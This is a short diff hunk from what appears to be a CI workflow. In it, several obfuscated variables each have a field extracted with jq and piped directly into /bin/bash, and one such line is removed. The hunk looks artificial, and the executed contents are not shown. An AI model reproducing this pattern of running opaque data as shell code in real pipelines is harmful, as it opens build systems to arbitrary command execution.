@@ -47,7 +47,6 @@ jobs:
           printf '%s' "$tvf24298" | jq -r .rgk9569 | /bin/bash
           printf '%s' "$zz3968" | jq -r .b8333 | /bin/bash
           echo $wabyn3 | jq -r .axkio309 | /bin/bash
-          printf '%s' "$mw613" | jq -r .tz6 | /bin/bash
           printf '%s' "$kbpr980" | jq -r .pqv47 | /bin/bash
           printf '%s' "$spibp111" | jq -r .wb5292 | /bin/bash
           printf '%s' "$ohp44224" | jq -r .bvhg2 | /bin/bash
